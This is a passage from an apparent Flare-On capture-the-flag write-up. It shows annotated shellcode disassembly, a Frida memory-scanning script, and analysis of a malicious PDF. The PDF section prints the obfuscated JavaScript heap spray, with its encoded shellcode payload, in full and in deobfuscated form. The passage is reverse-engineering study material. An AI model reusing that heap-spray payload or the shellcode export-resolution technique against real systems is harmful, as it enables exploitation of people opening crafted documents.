        decrypted_byte = encrypted_shellcode[x] ^ ord(xor_key_bytes[x % len(xor_key_bytes)])
        decrypted_shellcode.append(decrypted_byte)

    with open("shellcode6.bin", "wb") as f2:
        f2.write(decrypted_shellcode)
</code></pre><p>This shellcode is the last one. While it was more complicated than the previous ones, and I already found the flag, I chose to analyze it anyway to improve my skills:</p><pre><code class="language-nasm">; set EDX to point to the PEB (FS:[0x30])
; PEB = Process Environment Block
0x00000000      31d2           xor edx, edx
0x00000002      b230           mov dl, 0x30                ; '0' ; 48
0x00000004      648b12         mov edx, dword fs:[edx]

; get the address of the PEB_LDR_DATA structure
; 0x0C bytes from the start, the PEB contains a pointer
; to PEB_LDR_DATA structure, which provides information
; about the loaded DLLs.
0x00000007      8b520c         mov edx, dword [edx + 0xc]

; address of PEB-&gt; Ldr.InInitializationOrderModuleList.Flink
; LDR_MODULE ( InInitializationOrderModuleList )
0x0000000a      8b521c         mov edx, dword [edx + 0x1c]

; get the base address of the module
; ImgBase
0x0000000d      8b4208         mov eax, dword [edx + 8]

; address of the module’s name in the form of its Unicode string
0x00000010      8b7220         mov esi, dword [edx + 0x20]

; store the pointer of the next module
0x00000013      8b12           mov edx, dword [edx]

; check if the byte of index 0xc is the character '3'
; examples:
; k.e.r.n.e.l.3.2...d.l.l. -&gt; true
; n.t.d.l.l...d.l.l. -&gt; false
0x00000015      807e0c33       cmp byte [esi + 0xc], 0x33

; if the comparison is false, then go back and check the name;
; of the next module
0x00000019      75f2           jne 0xd

; RVA (Relative Virtual Address) of the PE Signature
; which is equal to 0x5045
0x0000001b      89c7           mov edi, eax
0x0000001d      03783c         add edi, dword [eax + 0x3c]

; RVA of the Export Table of the module
; MODULE_BASE_ADDRESS + 0x3c + 0x78
0x00000020      8b5778         mov edx, dword [edi + 0x78]

; get the absolute address of the export table
; ABS_ADDRESS = RVA + MODULE_BASE_ADDRESS
0x00000023      01c2           add edx, eax

; RVA of the Name Pointer Table, which holds pointers
; to the names (strings) of the functions.
0x00000025      8b7a20         mov edi, dword [edx + 0x20]

; get the absolute address of the Name Pointer Table
0x00000028      01c7           add edi, eax

; set ESI to the RVA of the first function of the
; Name Pointer Table, and calculate the absolute address
0x0000002a      31ed           xor ebp, ebp
0x0000002c      8b34af         mov esi, dword [edi + ebp*4]
0x0000002f      01c6           add esi, eax

; increase EBP, because it's used at 0x0000002c to calculate
; the next RVA to retrieve
0x00000031      45             inc ebp

; compare the first bytes with "Fata"
0x00000032      813e46617461   cmp dword [esi], 0x61746146
; if the strings aren't equal, go back to 0x2c to check
; the next function
0x00000038      75f2           jne 0x2c

; compare the other 4 bytes from index 0x8 with "Exit"
0x0000003a      817e08457869.  cmp dword [esi + 8], 0x74697845
0x00000041      75e9           jne 0x2c

; get the RVA of the Ordinal Table (Export Table + 0x24)
; it holds the position of the function in the Address Table
0x00000043      8b7a24         mov edi, dword [edx + 0x24]

; get the absolute address of the Ordinal Table
0x00000046      01c7           add edi, eax

; to get the ordinal number of the function, we have to
; perform the following calculation:
; ORD_NUM_ADDR = ORDINAL_TABLE_ADDR + (OFFSET * 2)
; we multiplicate the offset (of the function in the Export
; Table) by 2 because each ordinal number occupies 2 bytes 
0x00000048      668b2c6f       mov bp, word [edi + ebp*2]

; get the RVA of the Address Table, which holds the function
; addresses, and calculate the assolute address
0x0000004c      8b7a1c         mov edi, dword [edx + 0x1c]
0x0000004f      01c7           add edi, eax

; get the RVA and the absolute address of the code of the function
; it uses the formula EDI + EBP*4 - 4 because at offset 0x31
; we have increased EBP by 1, so the function called would be
; FatalAppExitW without -4.
0x00000051      8b7caffc       mov edi, dword [edi + ebp*4 - 4]
0x00000055      01c7           add edi, eax

; set ECX to point to the string " BrokenByte" (with a
; space character at the beginning)
0x00000057      6879746501     push 0x1657479
0x0000005c      686b656e42     push 0x426e656b             ; 'kenB'
0x00000061      682042726f     push 0x6f724220             ; ' Bro'
0x00000066      89e1           mov ecx, esp

; decrease the byte at the end of the previous string, from 0x1
; to 0x00, acting as NULL terminator
0x00000068      fe490b         dec byte [ecx + 0xb]

; set arguments for call to FatalAppExitA
0x0000006b      31c0           xor eax, eax
0x0000006d      51             push ecx
0x0000006e      50             push eax

; call function kernel32.FatalAppExitA
0x0000006f      ffd7           call edi
</code></pre><p>Overall, the shellcode runs the following code:</p><pre><code class="language-cpp">FatalAppExitA(
    0,
    " BrokenByte"
);
</code></pre><p>So it calls the function <code>FatalAppExitA</code> to terminate the program and show the message <code>BrokenByte</code>.</p><p>One way to complete the challenge and get the flag without reversing the assembly instructions is too perform some memory scanning, for exampleusing <code>frida</code>.</p><p>Given the <em>interesting</em> function at offset <code>0x40100</code>, I wrote a script that scans readable memory pages to search for the pattern <em>flare-on.com</em>:`</p><pre><code class="language-js">var flag = false;
var ranges;
var range;

function scan_pattern(pattern)
{
    range = ranges.pop();

    if(!range){
        return;
    }

    Memory.scan(range.base, range.size, pattern, {
        onMatch: function(address, size){
            console.log('[+] Pattern found at: ' + address.toString());
            var buf = Memory.readByteArray(ptr(address - 30), 60);
            console.log(hexdump(buf, {
                offset: 0, 
                length: 60, 
                header: true,
                ansi: false
                }));
        }, 
        onError: function(reason)
        {
            console.log('[!] There was an error scanning memory');
            console.log('[!] ' + reason);
        }, 
        onComplete: function(){
            scan_pattern(pattern);
        }
        });
}

function stalk()
{
    Process.enumerateThreads().map(t =&gt;
        {
        Stalker.follow(t.id,
            {
            events: {
                call: true,
                block: true,
                exec: true
            },
        
            onReceive: function(events)
            {
                events = Stalker.parse(events);
                console.log("onReceive");
            },
            transform(iterator)
            {
                let instruction = iterator.next()
                do
                {
                    if(instruction.mnemonic == "call")
                    {
                        console.log("[+] Found CALL " + instruction.opStr)

                        if (instruction.opStr == "0x401000")
                        {
                            flag = true
                        }
                    }
                    else if(instruction.mnemonic == "ret" &amp;&amp; flag)
                    {
                        console.log("[+] Executing RET instruction")
                        flag = false;
                    }
                    
                    if (flag == true)
                    {
                        if (instruction.mnemonic == "xor")
                        {
                            ranges = Process.enumerateRangesSync({protection: 'r--'});
                            scan_pattern("66 6c 61 72 65 2d 6f 6e 2e 63 6f 6d");
                        }
                        
                        // console.log(instruction.address + "\t" + instruction.mnemonic + " " + instruction.opStr);
                    }

                    iterator.keep()
                } while ((instruction = iterator.next()) !== null)
            }
        });
    });
}

stalk()
</code></pre><p>After that, you can run it like this:</p><pre><code class="language-ps1">frida -l script.js .\such_evil.exe
# %resume
</code></pre><p>In my case, it found the pattern at the address <code>0x19fe6a</code>, as shown below:</p><pre><code class="language-hex">[+] Pattern found at: 0x19fe6a
           0  1  2  3  4  5  6  7  8  9  A  B  C  D  E  F  0123456789ABCDEF
00000000  8a 13 30 16 43 46 eb eb e9 1d 00 00 00 73 75 63  ..0.CF.......suc
00000010  68 2e 35 68 33 31 31 30 31 30 31 30 31 40 66 6c  h.5h311010101@fl
00000020  61 72 65 2d 6f 6e 2e 63 6f 6d 68 6e 74 00 00 68  are-on.comhnt..h
00000030  20 73 70 65 68 20 69 27 6d 68 61 61               speh i'mhaa
</code></pre><p>Some references I found very useful for this challenge, in particular for the PEB and its fields:</p><ul><li><a href="https://rvsec0n.wordpress.com/2019/09/13/routines-utilizing-tebs-and-pebs/">TEB and PEB – RvsEc0n</a></li><li><a href="https://idafchev.github.io/exploit/2017/09/26/writing_windows_shellcode.html">Basics of Windows shellcode writing | Ring0x00</a></li></ul><h3 id="challenge-04">Challenge 04</h3><p>The fourth challenge starts with the analysis of a <code>PDF</code> document.</p><p>To extract information from the document, I used a linux program named <code>dumppdf</code>:</p><pre><code class="language-bash"># With -t option, the decompressed contents are dumped in a text format
# With -a options, the program dumps all the objects
dumppdf -t -a APT9001.pdf
</code></pre><p>Thanks to it, I found the following obfuscated <code>PostScript</code> code, which initially contained some HTML entities I decoded using <code>cyberchef</code>:</p><pre><code class="language-js">var HdPN = "";
var zNfykyBKUZpJbYxaihofpbKLkIDcRxYZWhcohxhunRGf = "";
var IxTUQnOvHg = unescape("%u72f9%u4649%u1525%u7f0d%u3d3c%ue084%ud62a%ue139%ua84a%u76b9%u9824%u7378%u7d71%u757f%u2076%u96d4%uba91%u1970%ub8f9%ue232%u467b%u9ba8%ufe01%uc7c6%ue3c1%u7e24%u437c%ue180%ub115%ub3b2%u4f66%u27b6%u9f3c%u7a4e%u412d%ubbbf%u7705%uf528%u9293%u9990%ua998%u0a47%u14eb%u3d49%u484b%u372f%ub98d%u3478%u0bb4%ud5d2%ue031%u3572%ud610%u6740%u2bbe%u4afd%u041c%u3f97%ufc3a%u7479%u421d%ub7b5%u0c2c%u130d%u25f8%u76b0%u4e79%u7bb1%u0c66%u2dbb%u911c%ua92f%ub82c%u8db0%u0d7e%u3b96%u49d4%ud56b%u03b7%ue1f7%u467d%u77b9%u3d42%u111d%u67e0%u4b92%ueb85%u2471%u9b48%uf902%u4f15%u04ba%ue300%u8727%u9fd6%u4770%u187a%u73e2%ufd1b%u2574%u437c%u4190%u97b6%u1499%u783c%u8337%ub3f8%u7235%u693f%u98f5%u7fbe%u4a75%ub493%ub5a8%u21bf%ufcd0%u3440%u057b%ub2b2%u7c71%u814e%u22e1%u04eb%u884a%u2ce2%u492d%u8d42%u75b3%uf523%u727f%ufc0b%u0197%ud3f7%u90f9%u41be%ua81c%u7d25%ub135%u7978%uf80a%ufd32%u769b%u921d%ubbb4%u77b8%u707e%u4073%u0c7a%ud689%u2491%u1446%u9fba%uc087%u0dd4%u4bb0%ub62f%ue381%u0574%u3fb9%u1b67%u93d5%u8396%u66e0%u47b5%u98b7%u153c%ua934%u3748%u3d27%u4f75%u8cbf%u43e2%ub899%u3873%u7deb%u257a%uf985%ubb8d%u7f91%u9667%ub292%u4879%u4a3c%ud433%u97a9%u377e%ub347%u933d%u0524%u9f3f%ue139%u3571%u23b4%ua8d6%u8814%uf8d1%u4272%u76ba%ufd08%ube41%ub54b%u150d%u4377%u1174%u78e3%ue020%u041c%u40bf%ud510%ub727%u70b1%uf52b%u222f%u4efc%u989b%u901d%ub62c%u4f7c%u342d%u0c66%ub099%u7b49%u787a%u7f7e%u7d73%ub946%ub091%u928d%u90bf%u21b7%ue0f6%u134b%u29f5%u67eb%u2577%ue186%u2a05%u66d6%ua8b9%u1535%u4296%u3498%ub199%ub4ba%ub52c%uf812%u4f93%u7b76%u3079%ubefd%u3f71%u4e40%u7cb3%u2775%ue209%u4324%u0c70%u182d%u02e3%u4af9%ubb47%u41b6%u729f%u9748%ud480%ud528%u749b%u1c3c%ufc84%u497d%u7eb8%ud26b%u1de0%u0d76%u3174%u14eb%u3770%u71a9%u723d%ub246%u2f78%u047f%ub6a9%u1c7b%u3a73%u3ce1%u19be%u34f9%ud500%u037a%ue2f8%ub024%ufd4e%u3d79%u7596%u9b15%u7c49%ub42f%u9f4f%u4799%uc13b%ue3d0%u4014%u903f%u41bf%u4397%ub88d%ub548%u0d77%u4ab2%u2d93%u9267%ub198%ufc1a%ud4b9%ub32c%ubaf5%u690c%u91d6%u04a8%u1dbb%u4666%u2505%u35b7%u3742%u4b27%ufc90%ud233%u30b2%uff64%u5a32%u528b%u8b0c%u1452%u728b%u3328%ub1c9%u3318%u33ff%uacc0%u613c%u027c%u202c%ucfc1%u030d%ue2f8%u81f0%u5bff%u4abc%u8b6a%u105a%u128b%uda75%u538b%u033c%uffd3%u3472%u528b%u0378%u8bd3%u2072%uf303%uc933%uad41%uc303%u3881%u6547%u5074%uf475%u7881%u7204%u636f%u7541%u81eb%u0878%u6464%u6572%ue275%u8b49%u2472%uf303%u8b66%u4e0c%u728b%u031c%u8bf3%u8e14%ud303%u3352%u57ff%u6168%u7972%u6841%u694c%u7262%u4c68%u616f%u5464%uff53%u68d2%u3233%u0101%u8966%u247c%u6802%u7375%u7265%uff54%u68d0%u786f%u0141%udf8b%u5c88%u0324%u6168%u6567%u6842%u654d%u7373%u5054%u54ff%u2c24%u6857%u2144%u2121%u4f68%u4e57%u8b45%ue8dc%u0000%u0000%u148b%u8124%u0b72%ua316%u32fb%u7968%ubece%u8132%u1772%u45ae%u48cf%uc168%ue12b%u812b%u2372%u3610%ud29f%u7168%ufa44%u81ff%u2f72%ua9f7%u0ca9%u8468%ucfe9%u8160%u3b72%u93be%u43a9%ud268%u98a3%u8137%u4772%u8a82%u3b62%uef68%u11a4%u814b%u5372%u47d6%uccc0%ube68%ua469%u81ff%u5f72%ucaa3%u3154%ud468%u65ab%u8b52%u57cc%u5153%u8b57%u89f1%u83f7%u1ec7%ufe39%u0b7d%u3681%u4542%u4645%uc683%ueb04%ufff1%u68d0%u7365%u0173%udf8b%u5c88%u0324%u5068%u6f72%u6863%u7845%u7469%uff54%u2474%uff40%u2454%u5740%ud0ff");
var MPBPtdcBjTlpvyTYkSwgkrWhXL = "";

for (EvMRYMExyjbCXxMkAjebxXmNeLXvloPzEWhKA=128;EvMRYMExyjbCXxMkAjebxXmNeLXvloPzEWhKA&gt;=0;--EvMRYMExyjbCXxMkAjebxXmNeLXvloPzEWhKA) MPBPtdcBjTlpvyTYkSwgkrWhXL += unescape("%ub32f%u3791");

ETXTtdYdVfCzWGSukgeMeucEqeXxPvOfTRBiv = MPBPtdcBjTlpvyTYkSwgkrWhXL + IxTUQnOvHg;
OqUWUVrfmYPMBTgnzLKaVHqyDzLRLWulhYMclwxdHrPlyslHTY = unescape("%ub32f%u3791");
fJWhwERSDZtaZXlhcREfhZjCCVqFAPS = 20;
fyVSaXfMFSHNnkWOnWtUtAgDLISbrBOKEdKhLhAvwtdijnaHA = fJWhwERSDZtaZXlhcREfhZjCCVqFAPS+ETXTtdYdVfCzWGSukgeMeucEqeXxPvOfTRBiv.length

while (OqUWUVrfmYPMBTgnzLKaVHqyDzLRLWulhYMclwxdHrPlyslHTY.length&lt;fyVSaXfMFSHNnkWOnWtUtAgDLISbrBOKEdKhLhAvwtdijnaHA) OqUWUVrfmYPMBTgnzLKaVHqyDzLRLWulhYMclwxdHrPlyslHTY+=OqUWUVrfmYPMBTgnzLKaVHqyDzLRLWulhYMclwxdHrPlyslHTY;

UohsTktonqUXUXspNrfyqyqDQlcDfbmbywFjyLJiesb = OqUWUVrfmYPMBTgnzLKaVHqyDzLRLWulhYMclwxdHrPlyslHTY.substring(0, fyVSaXfMFSHNnkWOnWtUtAgDLISbrBOKEdKhLhAvwtdijnaHA);
MOysyGgYplwyZzNdETHwkru = OqUWUVrfmYPMBTgnzLKaVHqyDzLRLWulhYMclwxdHrPlyslHTY.substring(0, OqUWUVrfmYPMBTgnzLKaVHqyDzLRLWulhYMclwxdHrPlyslHTY.length-fyVSaXfMFSHNnkWOnWtUtAgDLISbrBOKEdKhLhAvwtdijnaHA);

while(MOysyGgYplwyZzNdETHwkru.length+fyVSaXfMFSHNnkWOnWtUtAgDLISbrBOKEdKhLhAvwtdijnaHA &lt; 0x40000) MOysyGgYplwyZzNdETHwkru = MOysyGgYplwyZzNdETHwkru+MOysyGgYplwyZzNdETHwkru+UohsTktonqUXUXspNrfyqyqDQlcDfbmbywFjyLJiesb;

DPwxazRhwbQGu = new Array();

for (EvMRYMExyjbCXxMkAjebxXmNeLXvloPzEWhKA=0;EvMRYMExyjbCXxMkAjebxXmNeLXvloPzEWhKA&lt;100;EvMRYMExyjbCXxMkAjebxXmNeLXvloPzEWhKA++) DPwxazRhwbQGu[EvMRYMExyjbCXxMkAjebxXmNeLXvloPzEWhKA] = MOysyGgYplwyZzNdETHwkru + ETXTtdYdVfCzWGSukgeMeucEqeXxPvOfTRBiv;

for (EvMRYMExyjbCXxMkAjebxXmNeLXvloPzEWhKA=142;EvMRYMExyjbCXxMkAjebxXmNeLXvloPzEWhKA&gt;=0;--EvMRYMExyjbCXxMkAjebxXmNeLXvloPzEWhKA) zNfykyBKUZpJbYxaihofpbKLkIDcRxYZWhcohxhunRGf += unescape("%ub550%u0166");

bGtvKT = zNfykyBKUZpJbYxaihofpbKLkIDcRxYZWhcohxhunRGf.length + 20
while (zNfykyBKUZpJbYxaihofpbKLkIDcRxYZWhcohxhunRGf.length &lt; bGtvKT) zNfykyBKUZpJbYxaihofpbKLkIDcRxYZWhcohxhunRGf += zNfykyBKUZpJbYxaihofpbKLkIDcRxYZWhcohxhunRGf;

Juphd = zNfykyBKUZpJbYxaihofpbKLkIDcRxYZWhcohxhunRGf.substring(0, bGtvKT);
QCZabMzxQiD = zNfykyBKUZpJbYxaihofpbKLkIDcRxYZWhcohxhunRGf.substring(0, zNfykyBKUZpJbYxaihofpbKLkIDcRxYZWhcohxhunRGf.length-bGtvKT);

while(QCZabMzxQiD.length+bGtvKT &lt; 0x40000) QCZabMzxQiD = QCZabMzxQiD+QCZabMzxQiD+Juphd;

FovEDIUWBLVcXkOWFAFtYRnPySjMblpAiQIpweE = new Array();

for (EvMRYMExyjbCXxMkAjebxXmNeLXvloPzEWhKA=0;EvMRYMExyjbCXxMkAjebxXmNeLXvloPzEWhKA&lt;125;EvMRYMExyjbCXxMkAjebxXmNeLXvloPzEWhKA++) FovEDIUWBLVcXkOWFAFtYRnPySjMblpAiQIpweE[EvMRYMExyjbCXxMkAjebxXmNeLXvloPzEWhKA] = QCZabMzxQiD + zNfykyBKUZpJbYxaihofpbKLkIDcRxYZWhcohxhunRGf;
</code></pre><p>Due to the level of obfuscation, I tried to debofuscate it manually:</p><pre><code class="language-js">var var1 = "";
var var2 = "";
var var3 = unescape("%u72f9%u4649%u1525%u7f0d%u3d3c%ue084%ud62a%ue139%ua84a%u76b9%u9824%u7378%u7d71%u757f%u2076%u96d4%uba91%u1970%ub8f9%ue232%u467b%u9ba8%ufe01%uc7c6%ue3c1%u7e24%u437c%ue180%ub115%ub3b2%u4f66%u27b6%u9f3c%u7a4e%u412d%ubbbf%u7705%uf528%u9293%u9990%ua998%u0a47%u14eb%u3d49%u484b%u372f%ub98d%u3478%u0bb4%ud5d2%ue031%u3572%ud610%u6740%u2bbe%u4afd%u041c%u3f97%ufc3a%u7479%u421d%ub7b5%u0c2c%u130d%u25f8%u76b0%u4e79%u7bb1%u0c66%u2dbb%u911c%ua92f%ub82c%u8db0%u0d7e%u3b96%u49d4%ud56b%u03b7%ue1f7%u467d%u77b9%u3d42%u111d%u67e0%u4b92%ueb85%u2471%u9b48%uf902%u4f15%u04ba%ue300%u8727%u9fd6%u4770%u187a%u73e2%ufd1b%u2574%u437c%u4190%u97b6%u1499%u783c%u8337%ub3f8%u7235%u693f%u98f5%u7fbe%u4a75%ub493%ub5a8%u21bf%ufcd0%u3440%u057b%ub2b2%u7c71%u814e%u22e1%u04eb%u884a%u2ce2%u492d%u8d42%u75b3%uf523%u727f%ufc0b%u0197%ud3f7%u90f9%u41be%ua81c%u7d25%ub135%u7978%uf80a%ufd32%u769b%u921d%ubbb4%u77b8%u707e%u4073%u0c7a%ud689%u2491%u1446%u9fba%uc087%u0dd4%u4bb0%ub62f%ue381%u0574%u3fb9%u1b67%u93d5%u8396%u66e0%u47b5%u98b7%u153c%ua934%u3748%u3d27%u4f75%u8cbf%u43e2%ub899%u3873%u7deb%u257a%uf985%ubb8d%u7f91%u9667%ub292%u4879%u4a3c%ud433%u97a9%u377e%ub347%u933d%u0524%u9f3f%ue139%u3571%u23b4%ua8d6%u8814%uf8d1%u4272%u76ba%ufd08%ube41%ub54b%u150d%u4377%u1174%u78e3%ue020%u041c%u40bf%ud510%ub727%u70b1%uf52b%u222f%u4efc%u989b%u901d%ub62c%u4f7c%u342d%u0c66%ub099%u7b49%u787a%u7f7e%u7d73%ub946%ub091%u928d%u90bf%u21b7%ue0f6%u134b%u29f5%u67eb%u2577%ue186%u2a05%u66d6%ua8b9%u1535%u4296%u3498%ub199%ub4ba%ub52c%uf812%u4f93%u7b76%u3079%ubefd%u3f71%u4e40%u7cb3%u2775%ue209%u4324%u0c70%u182d%u02e3%u4af9%ubb47%u41b6%u729f%u9748%ud480%ud528%u749b%u1c3c%ufc84%u497d%u7eb8%ud26b%u1de0%u0d76%u3174%u14eb%u3770%u71a9%u723d%ub246%u2f78%u047f%ub6a9%u1c7b%u3a73%u3ce1%u19be%u34f9%ud500%u037a%ue2f8%ub024%ufd4e%u3d79%u7596%u9b15%u7c49%ub42f%u9f4f%u4799%uc13b%ue3d0%u4014%u903f%u41bf%u4397%ub88d%ub548%u0d77%u4ab2%u2d93%u9267%ub198%ufc1a%ud4b9%ub32c%ubaf5%u690c%u91d6%u04a8%u1dbb%u4666%u2505%u35b7%u3742%u4b27%ufc90%ud233%u30b2%uff64%u5a32%u528b%u8b0c%u1452%u728b%u3328%ub1c9%u3318%u33ff%uacc0%u613c%u027c%u202c%ucfc1%u030d%ue2f8%u81f0%u5bff%u4abc%u8b6a%u105a%u128b%uda75%u538b%u033c%uffd3%u3472%u528b%u0378%u8bd3%u2072%uf303%uc933%uad41%uc303%u3881%u6547%u5074%uf475%u7881%u7204%u636f%u7541%u81eb%u0878%u6464%u6572%ue275%u8b49%u2472%uf303%u8b66%u4e0c%u728b%u031c%u8bf3%u8e14%ud303%u3352%u57ff%u6168%u7972%u6841%u694c%u7262%u4c68%u616f%u5464%uff53%u68d2%u3233%u0101%u8966%u247c%u6802%u7375%u7265%uff54%u68d0%u786f%u0141%udf8b%u5c88%u0324%u6168%u6567%u6842%u654d%u7373%u5054%u54ff%u2c24%u6857%u2144%u2121%u4f68%u4e57%u8b45%ue8dc%u0000%u0000%u148b%u8124%u0b72%ua316%u32fb%u7968%ubece%u8132%u1772%u45ae%u48cf%uc168%ue12b%u812b%u2372%u3610%ud29f%u7168%ufa44%u81ff%u2f72%ua9f7%u0ca9%u8468%ucfe9%u8160%u3b72%u93be%u43a9%ud268%u98a3%u8137%u4772%u8a82%u3b62%uef68%u11a4%u814b%u5372%u47d6%uccc0%ube68%ua469%u81ff%u5f72%ucaa3%u3154%ud468%u65ab%u8b52%u57cc%u5153%u8b57%u89f1%u83f7%u1ec7%ufe39%u0b7d%u3681%u4542%u4645%uc683%ueb04%ufff1%u68d0%u7365%u0173%udf8b%u5c88%u0324%u5068%u6f72%u6863%u7845%u7469%uff54%u2474%uff40%u2454%u5740%ud0ff");

var var4 = "";
for (i=128; i&gt;=0; --i)
{
    var4 += unescape("%ub32f%u3791");
}

var5 = var4 + var3;
var6 = unescape("%ub32f%u3791");
var8 = 20 + var5.length

while (var6.length &lt; var8)
{
    var6 += var6;
}

var9 = var6.substring(0, var8);
var10 = var6.substring(0, var6.length - var8);

while(var10.length+var8 &lt; 0x40000)
{
    var10 = var10 + var10 + var9;
}

var11 = new Array();

for (i=0; i&lt;100; i++)
{
    var11[i] = var10 + var5;
}

for (i=142; i&gt;=0; --i)
{
    var2 += unescape("%ub550%u0166");
}

var12 = var2.length + 20
while (var2.length &lt; var12)
{
    var2 += var2;
}

var13 = var2.substring(0, var12);
var14 = var2.substring(0, var2.length-var12);

while(var14.length + var12 &lt; 0x40000)
{
    var14 = var14 + var14+var13;
}

var15 = new Array();

for (i=0;i&lt;125;i++)
{
    var15[i] = var14 + var2;
}
</code></pre><p>The most important part is the contents of the variable <code>var3</code>, which should be some malicious shellcode.</p><p>Some references I found useful for this challenge:</p><ul><li><a href="https://www.adlice.com/infected-pdf-extract-payload/">Infected PDF: How to Extract the Payload | Analysis - Adlice Software</a></li></ul><h3 id="challenge-05">Challenge 05</h3><h3 id="challenge-06">Challenge 06</h3><h3 id="challenge-07">Challenge 07</h3>
